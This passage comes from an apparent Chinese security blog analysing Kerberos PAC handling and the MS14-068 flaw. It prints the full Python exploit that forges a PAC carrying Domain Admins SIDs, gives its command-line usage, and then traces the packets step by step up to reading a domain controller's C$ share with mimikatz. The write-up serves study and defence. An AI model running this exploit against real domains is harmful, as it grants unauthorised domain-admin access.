Ticket）会包含用户的授权信息。用户再用包含有授权信息的TGT去申请相应的Service Ticket，AS(KDC)在收到这个KBR_AP_REQ请求的时候， 将TGT里的PAC信息解析出来， 加入到Service Ticket里返回。接下来， 当用户向服务器程序提交KRB_AP_REQ消息时， 服务器程序则将其中所包含的PAC信息传送给操作系统得到一个访问令牌， 并且同时将这个PAC的数字签名以KRB_VERIFY_PAC的消息传输给AS(KDC)， AS(KDC)再将验证这个PAC的数字签名的结果以RPC返回码的形式告诉服务器， 服务器就可以根据这个结果判断PAC数据的真实性和完整性，并做出最后对KRB_AP_REQ的判断。<br>&emsp;但是，PAC的引入并不是百利而无一害的，PAC在用户的认证阶段引入会导致认证耗时过长。这个问题是因为相较其他的实现，Windows Kerberos客户端会通过RPC调用KDC上的函数来验证PAC信息，这时候用户会观察到在服务器端与KDC之间的RPC包流量的增加。而另一方面， 由于PAC是微软特有的一个特性，所以启用了PAC的域中将不支持装有其他操作系统的服务器， 制约了域配置的灵活性。<br>&emsp;所以，对于PAC的使用还是由用户的应用特性来决定，如果需要减少服务器和KDC之间的认证信息流量从而使得用户能够更快的访问到所需要的资源，我们可以启用PAC；而另一方面，如果用户所属的组非常多，PAC信息本身所占用的容量会变得非常大，使得在做PAC认证的时候，服务器和KDC之间的数据通信变的异常频繁，用户可能因此在认证阶段耗时过长，那么我们就可以考虑禁用PAC来加快验证速度。</p><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>&emsp;通过上面对黄金票据的分析，我们知道了AS对于票据权限的检查，是基于票据中用户SID来进行的。所以如果我们能更改票据中的SID值，就能够将域用户进行提权。黄金票据漏洞可以修改SID，主要条件是知道域的SID和krbtgt账号密码的Hash，从而可以构造任意TGT票据。而ms14068<strong>不是</strong>通过黄金票据进行域用户提权的。<br>&emsp;其大概原理为，Client向AS(KDC)发送KRB_AS_REQ请求时，申请一张不包含PAC的TGT票据。并在Client向TGS发送KRB_TGS_REQ请求时，重新构造高权限TGT及PAC发送给TGS，TGS会返回一个新的TGT。<br>&emsp;<strong>漏洞利用的关键点:</strong></p><ul><li>在域中默认允许设置Include-pac的值为False（不能算漏洞，应该是微软对于某些特定场景的特殊考虑设计出的机制）。</li><li>PAC中的数字签名可以由Client端指定，并且Key的值可以为空。</li><li>PAC的加密方式也可以由Client指定，并且Key的值为generate_subkey函数生成的16位随机数。</li><li>构造的PAC中用户是高权限组的SID。</li></ul><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p><strong>参数说明：</strong>(<a href="https://github.com/abatchy17/WindowsExploits/tree/master/MS14-068" target="_blank" rel="noopener">EXP传送门</a>)</p><ul><li>-u 域账号+@+域名称，这里是ts1+@+yunying.lab</li><li>-p 为当前用户的密码，即ts1的密码</li><li>-s 为ts1的SID值，可以通过whoami /all来获取用户的SID值</li><li>-d 为当前域的域控</li></ul><ol><li>使用EXP伪造PAC，获取TGT票据<img src="/2019/08/05/结合ms14068对kerberos协议分析/4-1.png"><img src="/2019/08/05/结合ms14068对kerberos协议分析/4-2.png"></li><li>清除本地缓存的票据，并导入上一步获取的新票据<img src="/2019/08/05/结合ms14068对kerberos协议分析/4-3.png"><img src="/2019/08/05/结合ms14068对kerberos协议分析/4-4.png"></li><li>访问原来普通账号不能访问的域控共享文件<img src="/2019/08/05/结合ms14068对kerberos协议分析/4-5.png"></li></ol><h3 id="EXP源码"><a href="#EXP源码" class="headerlink" title="EXP源码"></a>EXP源码</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> sys, os</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> getrandbits</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> time, localtime, strftime</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> kek.ccache <span class="keyword">import</span> CCache, get_tgt_cred, kdc_rep2ccache</span><br><span class="line"><span class="keyword">from</span> kek.crypto <span class="keyword">import</span> generate_subkey, ntlm_hash, RC4_HMAC, HMAC_MD5</span><br><span class="line"><span class="keyword">from</span> kek.krb5 <span class="keyword">import</span> build_as_req, build_tgs_req, send_req, recv_rep, \</span><br><span class="line">    decrypt_as_rep, decrypt_tgs_rep, decrypt_ticket_enc_part, iter_authorization_data, \</span><br><span class="line">    AD_WIN2K_PAC</span><br><span class="line"><span class="keyword">from</span> kek.pac <span class="keyword">import</span> build_pac, pretty_print_pac</span><br><span class="line"><span class="keyword">from</span> kek.util <span class="keyword">import</span> epoch2gt, gt2epoch</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sploit</span><span class="params">(user_realm, user_name, user_sid, user_key, kdc_a, kdc_b, target_realm, target_service, target_host,</span></span></span><br><span class="line"><span class="function"><span class="params">           output_filename, krbtgt_a_key=None, trust_ab_key=None, target_key=None)</span>:</span></span><br><span class="line"></span><br><span class="line">    sys.stderr.write(<span class="string">'  [+] Building AS-REQ for %s...'</span> % kdc_a)</span><br><span class="line">    sys.stderr.flush()</span><br><span class="line">    nonce = getrandbits(<span class="number">31</span>)</span><br><span class="line">    current_time = time()</span><br><span class="line">    as_req = build_as_req(user_realm, user_name, user_key, current_time, nonce, pac_request=<span class="literal">False</span>)</span><br><span class="line">    sys.stderr.write(<span class="string">' Done!\n'</span>)</span><br><span class="line">    </span><br><span class="line">    sys.stderr.write(<span class="string">'  [+] Sending AS-REQ to %s...'</span> % kdc_a)</span><br><span class="line">    sys.stderr.flush()</span><br><span class="line">    sock = send_req(as_req, kdc_a)</span><br><span class="line">    sys.stderr.write(<span class="string">' Done!\n'</span>)</span><br><span class="line"></span><br><span class="line">    sys.stderr.write(<span class="string">'  [+] Receiving AS-REP from %s...'</span> % kdc_a)</span><br><span class="line">    sys.stderr.flush()</span><br><span class="line">    data = recv_rep(sock)</span><br><span class="line">    sys.stderr.write(<span class="string">' Done!\n'</span>)</span><br><span class="line"></span><br><span class="line">    sys.stderr.write(<span class="string">'  [+] Parsing AS-REP from %s...'</span> % kdc_a)</span><br><span class="line">    sys.stderr.flush()</span><br><span class="line">    as_rep, as_rep_enc = decrypt_as_rep(data, user_key)</span><br><span class="line">    session_key = (int(as_rep_enc[<span class="string">'key'</span>][<span class="string">'keytype'</span>]), str(as_rep_enc[<span class="string">'key'</span>][<span class="string">'keyvalue'</span>]))</span><br><span class="line">    logon_time = gt2epoch(str(as_rep_enc[<span class="string">'authtime'</span>]))</span><br><span class="line">    tgt_a = as_rep[<span class="string">'ticket'</span>]</span><br><span class="line">    sys.stderr.write(<span class="string">' Done!\n'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> krbtgt_a_key <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">print</span> &gt;&gt; sys.sdterr, as_rep.prettyPrint()</span><br><span class="line">        <span class="keyword">print</span> &gt;&gt; sys.stderr, as_rep_enc.prettyPrint()</span><br><span class="line">        ticket_debug(tgt_a, krbtgt_a_key)</span><br><span class="line">    </span><br><span class="line">    sys.stderr.write(<span class="string">'  [+] Building TGS-REQ for %s...'</span> % kdc_a)</span><br><span class="line">    sys.stderr.flush()</span><br><span class="line">    subkey = generate_subkey()</span><br><span class="line">    nonce = getrandbits(<span class="number">31</span>)</span><br><span class="line">    current_time = time()</span><br><span class="line">    pac = (AD_WIN2K_PAC, build_pac(user_realm, user_name, user_sid, logon_time))</span><br><span class="line">    tgs_req = build_tgs_req(user_realm, <span class="string">'krbtgt'</span>, target_realm, user_realm, user_name,</span><br><span class="line">                            tgt_a, session_key, subkey, nonce, current_time, pac, pac_request=<span class="literal">False</span>)</span><br><span class="line">    sys.stderr.write(<span class="string">' Done!\n'</span>)</span><br><span class="line"></span><br><span class="line">    sys.stderr.write(<span class="string">'  [+] Sending TGS-REQ to %s...'</span> % kdc_a)</span><br><span class="line">    sys.stderr.flush()</span><br><span class="line">    sock = send_req(tgs_req, kdc_a)</span><br><span class="line">    sys.stderr.write(<span class="string">' Done!\n'</span>)</span><br><span class="line"></span><br><span class="line">    sys.stderr.write(<span class="string">'  [+] Receiving TGS-REP from %s...'</span> % kdc_a)</span><br><span class="line">    sys.stderr.flush()</span><br><span class="line">    data = recv_rep(sock)</span><br><span class="line">    sys.stderr.write(<span class="string">' Done!\n'</span>)</span><br><span class="line"></span><br><span class="line">    sys.stderr.write(<span class="string">'  [+] Parsing TGS-REP from %s...'</span> % kdc_a)</span><br><span class="line">    tgs_rep, tgs_rep_enc = decrypt_tgs_rep(data, subkey)</span><br><span class="line">    session_key2 = (int(tgs_rep_enc[<span class="string">'key'</span>][<span class="string">'keytype'</span>]), str(tgs_rep_enc[<span class="string">'key'</span>][<span class="string">'keyvalue'</span>]))</span><br><span class="line">    tgt_b = tgs_rep[<span class="string">'ticket'</span>]</span><br><span class="line">    sys.stderr.write(<span class="string">' Done!\n'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> trust_ab_key <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        pretty_print_pac(pac[<span class="number">1</span>])</span><br><span class="line">        <span class="keyword">print</span> &gt;&gt; sys.stderr, tgs_rep.prettyPrint()</span><br><span class="line">        <span class="keyword">print</span> &gt;&gt; sys.stderr, tgs_rep_enc.prettyPrint()</span><br><span class="line">        ticket_debug(tgt_b, trust_ab_key)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> target_service <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">and</span> target_host <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">and</span> kdc_b <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        sys.stderr.write(<span class="string">'  [+] Building TGS-REQ for %s...'</span> % kdc_b)</span><br><span class="line">        sys.stderr.flush()</span><br><span class="line">        subkey = generate_subkey()</span><br><span class="line">        nonce = getrandbits(<span class="number">31</span>)</span><br><span class="line">        current_time = time()</span><br><span class="line">        tgs_req2 = build_tgs_req(target_realm, target_service, target_host, user_realm, user_name,</span><br><span class="line">                                tgt_b, session_key2, subkey, nonce, current_time)</span><br><span class="line">        sys.stderr.write(<span class="string">' Done!\n'</span>)</span><br><span class="line"></span><br><span class="line">        sys.stderr.write(<span class="string">'  [+] Sending TGS-REQ to %s...'</span> % kdc_b)</span><br><span class="line">        sys.stderr.flush()</span><br><span class="line">        sock = send_req(tgs_req2, kdc_b)</span><br><span class="line">        sys.stderr.write(<span class="string">' Done!\n'</span>)</span><br><span class="line"></span><br><span class="line">        sys.stderr.write(<span class="string">'  [+] Receiving TGS-REP from %s...'</span> % kdc_b)</span><br><span class="line">        sys.stderr.flush()</span><br><span class="line">        data = recv_rep(sock)</span><br><span class="line">        sys.stderr.write(<span class="string">' Done!\n'</span>)</span><br><span class="line"></span><br><span class="line">        sys.stderr.write(<span class="string">'  [+] Parsing TGS-REP from %s...'</span> % kdc_b)</span><br><span class="line">        tgs_rep2, tgs_rep_enc2 = decrypt_tgs_rep(data, subkey)</span><br><span class="line">        sys.stderr.write(<span class="string">' Done!\n'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        tgs_rep2 = tgs_rep</span><br><span class="line">        tgs_rep_enc2 = tgs_rep_enc</span><br><span class="line"></span><br><span class="line">    sys.stderr.write(<span class="string">'  [+] Creating ccache file %r...'</span> % output_filename)</span><br><span class="line">    cc = CCache((user_realm, user_name))</span><br><span class="line">    tgs_cred = kdc_rep2ccache(tgs_rep2, tgs_rep_enc2)</span><br><span class="line">    cc.add_credential(tgs_cred)</span><br><span class="line">    cc.save(output_filename)</span><br><span class="line">    sys.stderr.write(<span class="string">' Done!\n'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> target_key <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">print</span> &gt;&gt; sys.stderr, tgs_rep2.prettyPrint()</span><br><span class="line">        <span class="keyword">print</span> &gt;&gt; sys.stderr, tgs_rep_enc2.prettyPrint()</span><br><span class="line">        ticket_debug(tgs_rep2[<span class="string">'ticket'</span>], target_key)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Pretty print full ticket content</span></span><br><span class="line"><span class="comment"># Only possible in a lab environment when you already know krbtgt and/or service keys</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ticket_debug</span><span class="params">(ticket, key)</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        ticket_enc = decrypt_ticket_enc_part(ticket, key)</span><br><span class="line">        <span class="keyword">print</span> &gt;&gt; sys.stderr, ticket.prettyPrint()</span><br><span class="line">        <span class="keyword">for</span> ad <span class="keyword">in</span> iter_authorization_data(ticket_enc[<span class="string">'authorization-data'</span>]):</span><br><span class="line">            <span class="keyword">print</span> &gt;&gt; sys.stderr, <span class="string">'AUTHORIZATION-DATA (type: %d):'</span> % ad[<span class="string">'ad-type'</span>]</span><br><span class="line">            <span class="keyword">if</span> ad[<span class="string">'ad-type'</span>] == AD_WIN2K_PAC:</span><br><span class="line">                pretty_print_pac(str(ad[<span class="string">'ad-data'</span>]))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">print</span> &gt;&gt; sys.stderr, str(ad[<span class="string">'ad-data'</span>]).encode(<span class="string">'hex'</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'ERROR:'</span>, e</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">from</span> getopt <span class="keyword">import</span> getopt</span><br><span class="line">    <span class="keyword">from</span> getpass <span class="keyword">import</span> getpass</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">usage_and_exit</span><span class="params">()</span>:</span></span><br><span class="line">        <span class="keyword">print</span> &gt;&gt; sys.stderr, <span class="string">'USAGE:'</span></span><br><span class="line">        <span class="keyword">print</span> &gt;&gt; sys.stderr, <span class="string">'%s -u &lt;userName&gt;@&lt;domainName&gt; -s &lt;userSid&gt; -d &lt;domainControlerAddr&gt;'</span> % sys.argv[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">print</span> &gt;&gt; sys.stderr, <span class="string">''</span></span><br><span class="line">        <span class="keyword">print</span> &gt;&gt; sys.stderr, <span class="string">'OPTIONS:'</span></span><br><span class="line">        <span class="keyword">print</span> &gt;&gt; sys.stderr, <span class="string">'    -p &lt;clearPassword&gt;'</span></span><br><span class="line">        <span class="keyword">print</span> &gt;&gt; sys.stderr, <span class="string">' --rc4 &lt;ntlmHash&gt;'</span></span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    opts, args = getopt(sys.argv[<span class="number">1</span>:], <span class="string">'u:s:d:p:'</span>, [<span class="string">'rc4='</span>])</span><br><span class="line">    opts = dict(opts)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> all(k <span class="keyword">in</span> opts <span class="keyword">for</span> k <span class="keyword">in</span> (<span class="string">'-u'</span>, <span class="string">'-s'</span>, <span class="string">'-d'</span>)):</span><br><span class="line">        usage_and_exit()</span><br><span class="line"></span><br><span class="line">    user_name, user_realm = opts[<span class="string">'-u'</span>].split(<span class="string">'@'</span>, <span class="number">1</span>)</span><br><span class="line">    user_sid = opts[<span class="string">'-s'</span>]</span><br><span class="line">    kdc_a = opts[<span class="string">'-d'</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">'--rc4'</span> <span class="keyword">in</span> opts:</span><br><span class="line">        user_key = (RC4_HMAC, opts[<span class="string">'--rc4'</span>].decode(<span class="string">'hex'</span>))</span><br><span class="line">        <span class="keyword">assert</span> len(user_key[<span class="number">1</span>]) == <span class="number">16</span></span><br><span class="line">    <span class="keyword">elif</span> <span class="string">'-p'</span> <span class="keyword">in</span> opts:</span><br><span class="line">        user_key = (RC4_HMAC, ntlm_hash(opts[<span class="string">'-p'</span>]).digest())</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        user_key = (RC4_HMAC, ntlm_hash(getpass(<span class="string">'Password: '</span>)).digest())</span><br><span class="line"></span><br><span class="line">    target_realm = user_realm</span><br><span class="line">    target_service = target_host = kdc_b = <span class="literal">None</span></span><br><span class="line">    filename = <span class="string">'TGT_%s@%s.ccache'</span> % (user_name, user_realm)</span><br><span class="line"></span><br><span class="line">    user_realm = user_realm.upper()</span><br><span class="line">    target_realm = target_realm.upper()</span><br><span class="line"></span><br><span class="line">    sploit(user_realm, user_name, user_sid, user_key, kdc_a, kdc_b, target_realm, target_service, target_host, filename)</span><br></pre></td></tr></table></figure><h3 id="漏洞利用过程分析"><a href="#漏洞利用过程分析" class="headerlink" title="漏洞利用过程分析"></a>漏洞利用过程分析</h3><p>MS14068工具在使用过程中抓包可以看到s1和域控192.168.254.130（实质上是与安装在域控上的KDC）有KRB_AS_REQ,KRB_AS_REP,KRB_TGS_REQ,KRB_TGS_REP四次交互。</p><img src="/2019/08/05/结合ms14068对kerberos协议分析/4-6.png"><p><strong>下面根据流程和源码来看漏洞是如何利用的:</strong></p><h4 id="KRB-AS-REQ"><a href="#KRB-AS-REQ" class="headerlink" title="KRB_AS_REQ"></a><strong>KRB_AS_REQ</strong></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">as_req = build_as_req(user_realm, user_name, user_key, current_time, nonce, pac_request=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure><p>首先程序通过 build_as_req 函数构建AS_REQ，在这里可以看到，参数pac_request设置为false。<br>也就是说设置了这个参数之后会向KDC申请一张不包含PAC的TGT票据，这是<a href="https://docs.microsoft.com/en-us/previous-versions/aa302203(v=msdn.10)#security-considerations" target="_blank" rel="noopener">微软默认的设计</a>。</p><img src="/2019/08/05/结合ms14068对kerberos协议分析/4-7.png"><p>通过PCAP包可以更直观的看到在AS-REQ请求中的include-pac:False字段。这是造成这个漏洞的第一个因素。</p><img src="/2019/08/05/结合ms14068对kerberos协议分析/4-8.png"><h4 id="KRB-AS-REP"><a href="#KRB-AS-REP" class="headerlink" title="KRB_AS_REP"></a><strong>KRB_AS_REP</strong></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tgt_a = as_rep[<span class="string">'ticket'</span>]</span><br></pre></td></tr></table></figure><p>在AS发起请求之后，KDC（AS）将返回一张不包含有PAC的TGT票据给Client。在这里是tgt_a。<br>抓包可以看到这个以268fdb开头的TGT票据：</p><img src="/2019/08/05/结合ms14068对kerberos协议分析/4-9.png"><h4 id="KRB-TGS-REQ"><a href="#KRB-TGS-REQ" class="headerlink" title="KRB_TGS_REQ"></a><strong>KRB_TGS_REQ</strong></h4><p>攻击脚本使用了两个关键函数来实现这个过程，首先通过 build_pac 函数构造PAC，然后通过 build_tgs_req 函数构造TGS-REQ的内容。</p><h5 id="build-pac"><a href="#build-pac" class="headerlink" title="build_pac"></a><strong>build_pac</strong></h5><p>当Client接收到AS返回的不带有PAC的TGT之后通过脚本中的build_pac函数开始构造PAC。</p><img src="/2019/08/05/结合ms14068对kerberos协议分析/4-17.png"><p>这里我们重点关注一下PAC中的chksum1和chksum2，也就是“PAC的引入”中提到的PAC的两个数字签名PAC_SERVER_CHECKSUM和PAC_PRIVSVR_CHECKSUM。<br>注意一下其中第一个参数server_key[0]和kdc_key[0]的值其实是程序指定的RSA_MD5，而Key的值为None，但原则上来说这个加密方式是应该由AS(KDC)来确定的。也就是说加密PAC_SERVER_CHECKSUM和PAC_PRIVSVR_CHECKSUM这两个数字签名的Key应该分别是Server密码HASH和AS(KDC)密码HASH，在这里却直接使Key为None，然后直接使用RSA_MD5方式加密。</p><img src="/2019/08/05/结合ms14068对kerberos协议分析/4-18.png"><p>同时在这个过程中我们也需要关注一下user_sid这个参数，build_pac函数会将其分割，然后重新构造高权限的sid的值。在这里user_sid的值为S-1-5-21-4249968736-1423802980-663233003-1104，分割之后domain_sid为S-1-5-21-4249968736-1423802980-663233003，user_id为1104。</p><img src="/2019/08/05/结合ms14068对kerberos协议分析/4-19.png"><p>其中512、520、518、519分别为不同的组的sid号。512为DOMAIN ADMINS组。通过这种方式构造了包含高权限组SID的PAC。</p><img src="/2019/08/05/结合ms14068对kerberos协议分析/4-10.png"><h5 id="build-tgs-req"><a href="#build-tgs-req" class="headerlink" title="build_tgs_req"></a><strong>build_tgs_req</strong></h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tgs_req = build_tgs_req(user_realm, <span class="string">'krbtgt'</span>, target_realm, user_realm, user_name,</span><br><span class="line">                            tgt_a, session_key, subkey, nonce, current_time, pac, pac_request=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure><p>在build_tgs_req函数的参数中，authorization_data对应的为build_pac生成的pac。这里将PAC传入build_tgs_req之后使用subkey将其加密。而通过下图可以看到subkey其实是函数generate_subkey生成的一串16位的随机数。</p><img src="/2019/08/05/结合ms14068对kerberos协议分析/4-20.png"><img src="/2019/08/05/结合ms14068对kerberos协议分析/4-21.png"><img src="/2019/08/05/结合ms14068对kerberos协议分析/4-22.png"><p>通过抓包可以看到在这个过程中将接收的TGT（268fdb开头）和加密方式为ARCFOUR-HMAC-MD5的PAC内容:</p><img src="/2019/08/05/结合ms14068对kerberos协议分析/4-11.png"><h4 id="KRB-TGS-REP"><a href="#KRB-TGS-REP" class="headerlink" title="KRB_TGS_REP"></a><strong>KRB_TGS_REP</strong></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tgt_b = tgs_rep[<span class="string">'ticket'</span>]</span><br></pre></td></tr></table></figure><p>AS(KDC)在对伪造的PAC验证成功之后，返回给Client端一有新的TGT，并且这个TGT会将EXP生成的PAC包含在其中，这里正常情况下返回的其实是一张用于发送给Server端做认证的ST票据。<br>当Exp接收到新的TGT之后就将其保存生成ccache文件。也就是说这时Client已经获得了一张包含有高权限PAC内容的正常的TGT票据（564eab开头）：</p><img src="/2019/08/05/结合ms14068对kerberos协议分析/4-12.png"><h4 id="使用Mimikatz利用TGT访问DC共享文件夹"><a href="#使用Mimikatz利用TGT访问DC共享文件夹" class="headerlink" title="使用Mimikatz利用TGT访问DC共享文件夹"></a><strong>使用Mimikatz利用TGT访问DC共享文件夹</strong></h4><p>通过mimikatz来导入上面得到的TGG票据，并且用dir \dc.yunying.lab\c$来访问域控的共享文件夹：</p><img src="/2019/08/05/结合ms14068对kerberos协议分析/4-23.png"><p>抓包可以看到这时Client端发起了两次TGS-REQ请求，重点关注一下第一次，此时用的票据就是使用mimikatz导入的TGT，也就是上面KRB_TGS_REP过程中返回的那个tgt_b（564eab开头）：</p><img src="/2019/08/05/结合ms14068对kerberos协议分析/4-13.png"><p>请求之后返回了一张针对dc.yunying.lab（域控）的CIFS票据也就是正常流程中的ST（Service Ticket）票据（234062开头）：</p><img src="/2019/08/05/结合ms14068对kerberos协议分析/4-14.png"><p>这时在抓的包中发现并没有AP_REQ这个流程，是因为在Kerberos中AP_REQ这个过程放在了服务的第一次请求中，这里是放在SMB的Session Setup Request中（其他协议同理，比如HTTP协议是放在GET请求中）：</p><img src="/2019/08/05/结合ms14068对kerberos协议分析/4-15.png"><p>然后在SMB的Session Setup Response中做出响应，也就是AP-REP这个流程：</p><img src="/2019/08/05/结合ms14068对kerberos协议分析/4-16.png"><p>上述流程完成，Client就能够越权访问域控的共享文件夹了。</p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;Kerberos协议介绍&quot;&gt;&lt;a href=&quot;#Kerberos协议介绍&quot; class=&quot;headerlink&quot; title=&quot;Kerberos协议介绍&quot;&gt;&lt;/a&gt;Kerberos协议介绍&lt;/h2&gt;&lt;h3 id=&quot;什么是SSPI&quot;&gt;&lt;a href=&quot;#什么是SSPI&quot; class=&quot;headerlink&quot; title=&quot;什么是SSPI&quot;&gt;&lt;/a&gt;什么是SSPI&lt;/h3&gt;&lt;p&gt;&amp;emsp;安全支持提供者接口（英语：Security Support Provider Interface，缩写SSPI）是Microsoft Windows操作系统中用于执行各种安全相关操作（如身份验证）的一个Win32 API。&lt;br&gt;&amp;emsp;SSPI的功能是作为众多安全支持提供程序（SSP）的通用接口：安全支持提供者（Security Support Provider）是可以为应用程序提供一种或多种安全功能包的动态链接库（dynamic-link library）。&lt;/p&gt;
&lt;h3 id=&quot;Windows常用的SSP&quot;&gt;&lt;a href=&quot;#Windows常用的SSP&quot; class=&quot;headerlink&quot; title=&quot;Windows常用的SSP&quot;&gt;&lt;/a&gt;Windows常用的SSP&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;NTLM（Windows NT 3.51中引入）(msv1_0.dll) - 为Windows 2000之前的客户端-服务器域和非域身份验证（SMB/CIFS）提供NTLM质询/响应身份验证。&lt;/li&gt;
&lt;li&gt;Kerberos（Windows 2000中引入，Windows Vista中更新为支持AES）(kerberos.dll) - Windows 2000及更高版本中首选的客户端-服务器域相互身份验证。&lt;/li&gt;
